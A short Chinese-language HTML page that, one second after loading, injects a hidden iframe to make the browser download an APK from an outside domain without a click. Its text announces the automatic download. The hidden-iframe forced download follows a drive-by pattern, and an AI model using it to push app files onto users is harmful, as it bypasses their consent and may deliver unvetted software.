<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>自动下载 APK</title>
    <script>
        // 页面加载时延迟 1 秒后自动下载 APK
        window.onload = function() {
            setTimeout(function() {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = "https://agent.cbit.cc/4325270v120.apk";
                document.body.appendChild(iframe);
            }, 1000); // 1000 毫秒 = 1 秒
        };
    </script>
</head>
<body>
    <h1>正在准备下载...</h1>
    <p>请稍候，文件将自动下载。</p>
</body>
</html>
